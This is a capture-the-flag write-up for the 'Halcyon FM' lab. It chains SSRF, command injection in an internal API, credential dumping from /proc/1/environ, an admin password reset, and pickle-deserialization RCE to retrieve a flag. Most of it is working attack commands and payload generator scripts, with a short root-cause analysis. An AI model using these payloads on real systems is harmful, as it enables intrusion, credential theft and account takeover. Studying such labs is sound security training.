# Halcyon FM — Writeup

**Target:** `10.100.174.14` (`halcyonfm.local`, vhost `studio.halcyonfm.local`)
**Flag:** `WEBVERSE{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}`

## Summary

The public radio station site exposes a "pitch a show" feed-preview feature that is a full SSRF, including a hidden `is_dev` flag that returns the raw response body instead of just a reachability check. Pivoting through the SSRF onto the web container's own loopback surfaces an unauthenticated internal "ops API" on `127.0.0.1:8080`. That API's `stream-probe` diagnostic endpoint shells out to `curl` with unsanitized user input — command injection running as `opsapi`. From there:

1. Enumerate the filesystem and running processes.
2. Find that the ops API scrubs DB credentials from its **own** process environment after reading them, but the sibling gunicorn process (PID 1, started by the same entrypoint script) still has them in `/proc/1/environ`.
3. Rather than touch Postgres directly, just call the ops API's own (unauthenticated, POST-only) password-reset endpoint locally via the injected `curl`, bypassing the outer SSRF's GET-only limitation.
4. Log into the admin (`mfaro`) account on `studio.halcyonfm.local` with the new password.
5. The playout console has a "playlist import" feature that accepts a base64-encoded **Python pickle** (`.hpl` file). Unpickling untrusted input is arbitrary code execution — craft a payload with a malicious `__reduce__`, upload it, and have it write files into the app's own `static/` directory so the output can be read back over plain HTTP.
6. Use the same primitive to `cat` `/home/halcyon/flag.txt` into `static/flag.txt` and read it.

## Attack chain

**1. Recon** — added `studio.halcyonfm.local` to `/etc/hosts`, confirmed it's a login-gated Flask app (`Sign in - Halcyon FM Playout`), and pulled `demo.js` from the public site, which revealed a `/api/shows/import-preview` endpoint that POSTs `{feed_url, is_dev}` and, per a comment in the JS, only returns the fetched response body when `is_dev` is true (the UI always sends `false`).

**2. SSRF confirmed, `is_dev:true` returns full response body.** Port-scanned the loopback interface of the web container through the endpoint (connection-refused vs. real HTTP responses distinguished open vs. closed ports). Found:
- `127.0.0.1:8000` → the same public site (gunicorn)
- `127.0.0.1:8080` → an internal, unauthenticated **`halcyon-ops-api` v1.4.2** ("Loopback only" per its own `/` status endpoint), with a `/swagger.json` spec exposing three routes:
  - `GET /api/v1/users` — dumps all station accounts (found admin user `mfaro`, id 1)
  - `POST /api/v1/{userid}/change-password?new_password=...`
  - `GET /api/v1/diagnostics/stream-probe?stream_url=...` — "curl probe result"

**3. Command injection in `stream-probe`.** The endpoint builds a shell command by string-concatenating the raw `stream_url` into `curl ... <url> 2>&1` and runs it via `os.popen`. Confirmed with `;id` and backtick payloads — code execution as `uid=999(opsapi)`.

**4. Filesystem/process enumeration** through the same injection point revealed:
- App source at `/app` (`internal_api.py`, `public_app.py`, `entrypoint.sh`)
- `internal_api.py` reads `DB_HOST/PORT/NAME/USER/PASSWORD` from its environment then explicitly `os.environ.pop()`s them — specifically to defeat this exact env-dumping trick on *its own* process.
- `entrypoint.sh` backgrounds `internal_api.py` and then `exec`s gunicorn (`public_app:app`) as PID 1 — gunicorn inherits the same unscrubbed environment. Reading `/proc/1/environ` recovered `DB_HOST=db`, `DB_NAME=halcyon`, `DB_USER=halcyon_ops`, `DB_PASSWORD=halcyon_ops_pw`.

**5. Privilege pivot without touching Postgres directly.** Rather than connect to the DB (no `psql` available, `psycopg2` usable but fiddly through this channel), used the RCE to invoke the ops API's own password-reset route over local loopback with `curl -X POST` (bypassing the outer SSRF's GET-only restriction), resetting user id `1` (`mfaro`, admin) to a known password. Response confirmed `{"ok":true,"userid":1}`.

**6. Authenticated as admin** on `studio.halcyonfm.local` (`POST /login`), landing on `/dashboard` — the Playout Console — as Marlow Faro, admin.

**7. Insecure deserialization in playlist import.** The dashboard has an "Import playlist" feature (`POST /playlists/import`, multipart file upload) that loads `.hpl` bundles, which `/playlists/export` revealed are just base64-encoded **Python pickle** data (`pickletools.dis` confirmed a plain dict payload: `{name, tracks[...]}`). Since the import handler unpickles attacker-controlled input, crafted a payload with:

```python
class Evil:
    def __reduce__(self):
        return (os.system, ("<shell command>",))
```

Uploading this executes the embedded shell command as the studio app's user (`uid=1001(halcyon)`) during deserialization.

**8. Exfiltration and flag retrieval.** Used the pickle RCE to redirect command output into the app's own `static/` directory (already served over HTTP), so results could be read back with a plain `GET`. First pass (`id`, `find / -iname "*flag*"`, `ls -la /app`) located `/home/halcyon/flag.txt`. Second payload `cat`'d it straight into `static/flag.txt` and it was read back over HTTP.

## Root causes

- **SSRF with a hidden debug mode** (`is_dev`) that returns full response bodies to an unauthenticated caller — should never be client-toggleable.
- **Internal API trusted the loopback with zero authentication**, relying entirely on network segmentation that the SSRF completely undermines.
- **Unsanitized input passed to a shell (`os.popen`)** — classic command injection; should use `subprocess.run([...], shell=False)` with an argument list, or better, a proper HTTP/socket-based reachability check instead of shelling out to `curl`.
- **Inconsistent secret scrubbing** — scrubbing env vars in one process while a sibling process (started from the same shell) retains them provides a false sense of security; secrets shouldn't be passed via environment to multiple processes if any one of them is exposed to injection.
- **Unauthenticated password-reset endpoint** on the internal API — even "trusted network" internal services should authenticate/authorize state-changing actions.
- **`pickle.loads()` on user-uploaded file content** is inherently unsafe; there's no way to sandbox arbitrary `__reduce__` execution. Use a safe serialization format (JSON, msgpack without custom types) for anything crossing a trust boundary.

## Consolidated commands

```bash
# --- Recon: add subdomain, confirm login wall, pull JS ---
TARGET=10.100.174.14
BASE=halcyonfm.local
OUT=./halcyon_recon
mkdir -p $OUT
echo "$TARGET studio.$BASE" | sudo tee -a /etc/hosts
curl -sk -i -H "Host: studio.$BASE" http://$TARGET/
curl -sk -i -L -H "Host: studio.$BASE" http://$TARGET/
curl -sk http://$BASE/static/js/demo.js -o $OUT/demo.js
cat $OUT/demo.js
grep -Eo "(fetch|axios|XMLHttpRequest)\([^)]*|/api/[a-zA-Z0-9/_-]*|action=\"[^\"]*\"" $OUT/demo.js

# --- SSRF: confirm is_dev:true returns full body ---
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview \
  -d '{"feed_url":"http://studio.halcyonfm.local/","is_dev":true}'

# --- Internal loopback port scan via SSRF ---
for port in 22 21 25 3306 5432 6379 8000 8080 8443 9000 9090; do
  echo "== $port =="
  curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview \
    -d "{\"feed_url\":\"http://127.0.0.1:$port/\",\"is_dev\":true}"
  echo
done

# --- Pull ops-api swagger spec + docs (found on :8080) ---
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview \
  -d '{"feed_url":"http://127.0.0.1:8080/swagger.json","is_dev":true}'
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview \
  -d '{"feed_url":"http://127.0.0.1:8080/docs/","is_dev":true}'

# --- List station accounts on ops-api (id 1 = mfaro, admin) ---
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview \
  -d '{"feed_url":"http://127.0.0.1:8080/api/v1/users","is_dev":true}'

# --- Confirm command injection in stream-probe (curl shell-out) ---
python3 -c "
import json
payload = {'feed_url': 'http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http://127.0.0.1:8000/;id', 'is_dev': True}
print(json.dumps(payload))
" > /tmp/inj1.json
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview -d @/tmp/inj1.json

# --- Enumerate filesystem / app source via injection ---
python3 -c "
import json
payload = {'feed_url': 'http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http://127.0.0.1:8000/;ls -la /app;cat /app/internal_api.py;cat /app/entrypoint.sh', 'is_dev': True}
print(json.dumps(payload))
" > /tmp/inj2.json
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview -d @/tmp/inj2.json

# --- List processes (ps missing, use /proc) to find PID 1 = gunicorn ---
python3 -c "
import json
payload = {'feed_url': 'http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http://127.0.0.1:8000/;for p in /proc/[0-9]*; do echo -n \"\$p: \"; cat \$p/cmdline 2>/dev/null | tr \"\\\\0\" \" \"; echo; done', 'is_dev': True}
print(json.dumps(payload))
" > /tmp/inj3.json
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview -d @/tmp/inj3.json

# --- Dump DB creds from PID 1's environ (not scrubbed like internal_api.py's own env) ---
python3 -c "
import json
payload = {'feed_url': 'http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http://127.0.0.1:8000/;cat /proc/1/environ | tr \"\\\\0\" \"\\\\n\"', 'is_dev': True}
print(json.dumps(payload))
" > /tmp/inj4.json
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview -d @/tmp/inj4.json
# -> DB_HOST=db DB_NAME=halcyon DB_USER=halcyon_ops DB_PASSWORD=halcyon_ops_pw

# --- Reset mfaro's (userid=1) password via local loopback curl (bypasses GET-only outer SSRF) ---
python3 -c "
import json
payload = {'feed_url': 'http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http://127.0.0.1:8000/;curl -s -X POST \"http://127.0.0.1:8080/api/v1/1/change-password?new_password=Pwn3d123x\"', 'is_dev': True}
print(json.dumps(payload))
" > /tmp/inj5.json
curl -sk -H "Content-Type: application/json" -X POST http://$BASE/api/shows/import-preview -d @/tmp/inj5.json

# --- Log in as mfaro on the studio console ---
curl -sk -i -c $OUT/cookies.txt -H "Host: studio.$BASE" -X POST http://$TARGET/login \
  -d "username=mfaro&password=Pwn3d123x"
curl -sk -i -b $OUT/cookies.txt -H "Host: studio.$BASE" http://$TARGET/dashboard

# --- Pull a sample .hpl export, confirm it's a base64 Python pickle ---
curl -sk -b $OUT/cookies.txt -H "Host: studio.$BASE" http://$TARGET/playlists/export -o $OUT/sample.hpl.b64
base64 -d $OUT/sample.hpl.b64 > $OUT/sample.pkl
python3 -c "import pickletools; pickletools.dis(open('$OUT/sample.pkl','rb').read())"

# --- Craft malicious pickle: writes command output into app's own static/ dir ---
cat > $OUT/make_evil.py << 'PYEOF'
import pickle, os, base64

class Evil:
    def __reduce__(self):
        cmd = (
            'id > /app/static/pwned.txt 2>&1; '
            'echo ---- >> /app/static/pwned.txt; '
            'find / -iname "*flag*" 2>/dev/null >> /app/static/pwned.txt; '
            'echo ---- >> /app/static/pwned.txt; '
            'ls -la /app >> /app/static/pwned.txt 2>&1'
        )
        return (os.system, (cmd,))

payload = pickle.dumps(Evil(), protocol=4)
with open('evil.hpl', 'wb') as f:
    f.write(base64.b64encode(payload))
print('written')
PYEOF
python3 $OUT/make_evil.py

# --- Upload it to trigger deserialization RCE, then read the output over HTTP ---
curl -sk -i -b $OUT/cookies.txt -H "Host: studio.$BASE" -X POST http://$TARGET/playlists/import \
  -F "bundle=@evil.hpl;type=application/octet-stream"
curl -sk -H "Host: studio.$BASE" http://$TARGET/static/pwned.txt
# -> confirms uid=1001(halcyon) and finds /home/halcyon/flag.txt

# --- Second pickle: cat the flag directly into static/, then read it ---
cat > $OUT/make_evil3.py << 'PYEOF'
import pickle, os, base64

class Evil:
    def __reduce__(self):
        cmd = 'cat /home/halcyon/flag.txt > /app/static/flag.txt 2>&1'
        return (os.system, (cmd,))

payload = pickle.dumps(Evil(), protocol=4)
with open('evil3.hpl', 'wb') as f:
    f.write(base64.b64encode(payload))
print('written')
PYEOF
python3 $OUT/make_evil3.py

curl -sk -i -b $OUT/cookies.txt -H "Host: studio.$BASE" -X POST http://$TARGET/playlists/import \
  -F "bundle=@evil3.hpl;type=application/octet-stream"
curl -sk -H "Host: studio.$BASE" http://$TARGET/static/flag.txt
# -> WEBVERSE{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
